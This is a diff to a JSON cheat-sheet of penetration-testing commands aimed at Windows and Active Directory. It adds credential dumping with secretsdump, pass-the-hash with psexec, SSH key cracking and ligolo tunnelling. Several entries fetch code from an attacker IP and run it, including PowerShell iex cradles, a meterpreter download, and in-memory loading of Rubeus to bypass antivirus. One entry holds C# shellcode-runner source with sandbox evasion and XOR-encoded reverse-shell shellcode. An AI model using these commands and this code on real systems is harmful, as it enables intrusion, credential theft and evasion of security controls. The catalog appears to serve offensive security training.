@@ -89,6 +89,29 @@
     "name": "Impacket-RBCD"
   },
   {
+    "description": "Impacket-secretsdump can extract credential information from a target machine. Instead of connecting to a live system, this command extracts NTLM hashes, LSA secrets, and other credentials from offline SYSTEM and SAM registry hive files. This is useful when access to a machine is already obtained, and the registry hives are dumped for offline analysis.\n\nCommand Reference:\n\n\t-system: system.hive of target machine\n\n\t-sam: sam.hive of target machine\n",
+    "command": "impacket-secretsdump -system system.hive -sam sam.hive LOCAL\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+      "https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
+    ],
+    "name": "Impacket-SecretsDump-Hive"
+  },
+  {
     "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
     "command": "crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups\n",
     "items": [
@@ -563,8 +586,9 @@
     "name": "SecureString"
   },
   {
-    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n",
-    "command": "export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass\n",
+    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py. Important to mention is that Kerberos prefers hostnames instead of IP's, therefore specify -target-ip.\n\nCommand Reference:\n\n  Target hostname: backup01.test.local\n\n\tTarget IP: 10.10.10.1\n\n  Domain controller: 10.10.10.111\n\n\tDomain: test.local\n\n\tUsername: john (his ticket is in cache)\n",
+    "command": "impacket-psexec -k -no-pass -target-ip 10.10.10.1 -dc-ip 10.10.10.111 backup01.test.local\n",
+    "code": "export KRB5CCNAME=/full/path/to/john.ccache; \n",
     "items": [
       "TGS",
       "Username"
@@ -983,6 +1007,29 @@
     "name": "AlwaysInstallElevated"
   },
   {
+    "description": "sshng2john is a tool used to convert SSH private keys in OpenSSH format to a format that can be cracked using password cracking tools like John the Ripper. This can finally result in cracking the password of the private key.\n\nCommand Reference:\n```\nPrivate SSH key: id_rsa\n```\n",
+    "command": "python3 ssh2john.py id_rsa.enc > sshkey.john\n",
+    "code": "john --wordlist=/opt/wordlists/rockyou.txt sshkey.john\n",
+    "items": [
+      "SSH_key"
+    ],
+    "services": [
+      "SSH"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Cracking"
+    ],
+    "references": [
+      "https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py",
+      "https://github.com/Kyuu-Ji/htb-write-up/blob/master/tenten/write-up-tenten.md"
+    ],
+    "name": "ssh2john"
+  },
+  {
     "description": "SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.\n",
     "command": "SharpDump.exe\n",
     "items": [
@@ -1326,8 +1373,8 @@
     "name": "Crackmapexec-Enum-SMB-Anonymous"
   },
   {
-    "description": "BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.\n\nBloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tDomain: test.local\n",
-    "command": "bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1\n",
+    "description": "BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.\n\nBloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP\n\nCommand Reference:\n\n\t-ns (target IP / domain controller): 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tDomain: test.local\n\n  --hashes: \":NTLM_HASH\" (in case of pass the hash)\n",
+    "command": "python3 bloodhound.py -u john -p password123 -d test.local -v -c All -d test.local -ns 10.10.10.1\n",
     "items": [
       "Username",
       "Password"
@@ -1344,7 +1391,7 @@
     ],
     "references": [
       "https://github.com/BloodHoundAD/BloodHound",
-      "https://github.com/fox-it/BloodHound.py"
+      "https://github.com/dirkjanm/BloodHound.py"
     ],
     "name": "BloodHound.py-Remote-Ingestion-Creds"
   },
@@ -1978,6 +2025,29 @@
     "name": "Impacket-atexec-Hash"
   },
   {
+    "description": "Ligolo is an advanced tunneling tool designed for red teaming and penetration testing. It enables attackers to establish reverse tunnels and pivot within a compromised network. The advantage of this tool is that the traffic is tunneled and you can run commands on the compromised network without added proxychains in the front of the command.\n\nCommand Reference:\n```\nPort: 8008\n\nIP address to which the agent must connect: 0.0.0.0\n```\n",
+    "command": "ligolo-proxy -selfcert -laddr 0.0.0.0:8008\n",
+    "code": "Create tap interface for ligolo:\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\n\nOn target machine run the agent:\n./agent -connect 192.168.49.52:8008 -ignore-cert\n\nAdd internal route of target device to ligolo interface:\nsudo ip route add 172.16.10.0/24 dev ligolo\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "General",
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/nicocha30/ligolo-ng"
+    ],
+    "name": "ligolo-ng"
+  },
+  {
     "description": "targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print \"kerberoast\" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the \"kerberoast\" hash, and delete the temporary SPN set for that operation.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
     "command": "python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1\n",
     "items": [
@@ -1998,6 +2068,27 @@
       "https://github.com/ShutdownRepo/targetedKerberoast"
     ],
     "name": "targetedKerberoast"
+  },
+  {
+    "description": "This command can be executed from the command line of a Windows machine. It retrieves the ps1-file (could also be a txt-file) holding commands that will be executed. This can be useful running Powershell shellcode runner or downloading and executing meterpreter payloads.\n\nCommand Reference:\n```\nIP address of kali machine: 10.10.10.1\n\nstage.ps1: file containing commands \n\n```\n",
+    "command": "powershell iex(iwr -useb 10.10.10.1/stage.ps1)\n",
+    "code": "iwr 10.10.10.1/met.exe -O C:/Windows/Tasks/met.exe\nC:/Windows/Tasks/met.exe \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      null
+    ],
+    "name": "powershell-run-ps1"
   },
   {
     "description": "SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -2093,6 +2184,27 @@
       "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction"
     ],
     "name": "LocalAccessFilterPolicy-bypass"
+  },
+  {
+    "description": "This technique allows an attacker to download and execute a .NET assembly (EXE) from a remote source in memory, without writing it to disk. This is useful for bypassing antivirus (AV) and endpoint detection and response (EDR) solutions since the file never touches the disk. The following PowerShell command retrieves an executable (e.g., Rubeus.exe) from a remote server, loads it directly into memory using .NET reflection, and executes a function inside it. \n\nCommand Reference:\n```\nAttacking IP: 10.10.10.1\n\nExecutable to be loaded: Rubeus.exe\n\nArguments of executable: dump /nowrap\n```\n",
+    "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.1/Rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n\n[Rubeus.Program]::Main(\"dump /nowrap\".Split()) \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "Antivirus"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing",
+      "Injection"
+    ],
+    "references": [
+      "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md#quick-start"
+    ],
+    "name": "LoadExecutableInMemory"
   },
   {
     "description": "Impacket's smbexec.py. This will give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -2850,7 +2962,7 @@
       "Shell"
     ],
     "services": [
-      null
+      "Antivirus"
     ],
     "OS": [
       "Windows"
@@ -2905,14 +3017,14 @@
     "name": "Crackmapexec-Enum-SMB-Relay-List"
   },
   {
-    "description": "Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter shell. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine.\n\nCommand Reference:\n\n\tbyte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n",
-    "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')\n\n$assem = [System.Reflection.Assembly]::Load($data)\nor (for local file)\n$assem = [System.Reflection.Assembly]::LoadFile(\"C:\\user\\documents\\ClassLibrary1.dll\")\n\n$class = $assem.GetType(\"ShellcodeRunner.Program\")\n$method = $class.GetMethod(\"Run\")\n$method.Invoke(0, $null)\nOr\n$a = [ShellcodeRunner.Program]::Run()\n```\n",
+    "description": "Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter payload. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine. Important to note is the naming of the namespace 'ShellcodeRunner' and the method that must be executed 'Run'. Those are mentioned in the commands.\n\nCommand Reference:\n\n\tKali machine: 10.10.14.21\n\n\tbyte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n",
+    "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')\n\n$assem = [System.Reflection.Assembly]::Load($data)\nor (for local file)\n$assem = [System.Reflection.Assembly]::LoadFile(\"C:\\user\\documents\\ClassLibrary1.dll\")\n\n$class = $assem.GetType(\"ShellcodeRunner.Program\")\n$method = $class.GetMethod(\"Run\")\n$method.Invoke(0, $null)\nOr\n$a = [ShellcodeRunner.Program]::Run()\n",
     "code": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner\n{\n    public class Program\n    {\n        [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern void Sleep(uint dwMilliseconds);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern IntPtr GetCurrentProcess();\n\n        public static void Run()\n        {\n            // Check if we're in a sandbox by calling a rare-emulated API\n            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)\n            {\n                return;\n            }\n\n            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction\n            var rand = new Random();\n            uint dream = (uint)rand.Next(10000, 20000);\n            double delta = dream / 1000 - 0.5;\n            DateTime before = DateTime.Now;\n            Sleep(dream);\n            if (DateTime.Now.Subtract(before).TotalSeconds < delta)\n            {\n                Console.WriteLine(\"Charles, get the rifle out. We're being fucked.\");\n                return;\n            }\n\n            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a\n            byte[] buf = new byte[657] {0x9d,0x29,0xe2, [...]\n                            ,0x9e,0xb4};\n\n            // XOR-decrypt the shellcode\n            for (int i = 0; i < buf.Length; i++)\n            {\n                buf[i] = (byte)(buf[i] ^ (byte)'a');\n            }\n\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}\n",
     "items": [
       "Shell"
     ],
     "services": [
-      null
+      "Antivirus"
     ],
     "OS": [
       "Windows"
@@ -3014,29 +3126,6 @@
       "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
     ],
     "name": "Impacket-RPCDump"
-  },
-  {
-    "description": "sshng2john is a tool used to convert SSH private keys in OpenSSH format to a format that can be cracked using password cracking tools like John the Ripper. This can finally result in cracking the password of the private key.\n\nCommand Reference:\n```\nPrivate SSH key: id_rsa\n```\n",
-    "command": "sshng2john.py id_rsa\n",
-    "code": "john --wordlist=/opt/wordlists/rockyou.txt sshkey.john\n",
-    "items": [
-      "SSH_key"
-    ],
-    "services": [
-      "SSH"
-    ],
-    "OS": [
-      "Windows",
-      "Linux"
-    ],
-    "attack_types": [
-      "Cracking"
-    ],
-    "references": [
-      "https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py",
-      "https://github.com/Kyuu-Ji/htb-write-up/blob/master/tenten/write-up-tenten.md"
-    ],
-    "name": "SSHngtojohn"
   },
   {
     "description": "\"Airport\" in macOS, accessed via the \"System Information\" app or Terminal with options like -s and -I, provides in-depth WiFi statistics with a security focus. The -s flag lists WiFi networks with security information like encryption type, while -I delivers comprehensive details about a specific network, aiding users and administrators in assessing the security posture of wireless connections. This feature empowers users to make informed decisions and take measures to enhance the security of their WiFi interactions on Mac devices.\n\nCommand Reference:\n```\n-s: Perform a wireless broadcast scan.\n\n-I: Print current wireless status, e.g. link auth, signal info, BSSID, port type etc.\n```\n",
@@ -3232,8 +3321,9 @@
     "name": "Dementor"
   },
   {
-    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. Or can also be used to find writable shares on the target machine.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
-    "command": "python3 psexec.py test.local/john:password123@10.10.10.1\n",
+    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. Or can also be used to find writable shares on the target machine.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tDomain controller: 10.10.10.111  \n\n\tUsername: john\n\n\tPassword: password123\n  \n\t--hashes: \":31d6cfe0d16ae931b73c59d7e0c089c0\" (for pass the hash)\n",
+    "command": "impacket-psexec test.local/john:password123@10.10.10.1 -dc-ip 10.10.10.111\n",
+    "code": "impacket-psexec test.local/john@10.10.10.1 -hashes \":31d6cfe0d16ae931b73c59d7e0c089c0\" -dc-ip 10.10.10.111\n",
     "items": [
       "Password",
       "Username"
@@ -3318,7 +3408,7 @@
     "name": "Netstat-windows"
   },
   {
-    "description": "ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records)and GET and POST parameter fuzzing. \n\nCommand Reference:\n```\nBurprequest in file: req\n\nProtocol: https\n\nWordlist with placeholder to replace (FUZZ): /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ\n\n```\n",
+    "description": "ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records)and GET and POST parameter fuzzing. \n\nCommand Reference:\n```\nBurp request in file: req\n\nProtocol: https\n\nWordlist with placeholder to replace (FUZZ): /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ\n\n```\n",
     "command": "ffuf -request req -request-proto https -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ > ffuf.out\n",
     "code": "POST /2fa.html HTTP/2\nHost: teamcity-dev.coder.htb\nCookie: __test=1; RememberMe=394468061^2#-7089909565306817793; TCSESSIONID=55B00B03A2687F2331142FB623BF2CCC\nAccept: application/json\nOrigin: https://teamcity-dev.coder.htb\n\npassword=FUZZ  \n",
     "items": [
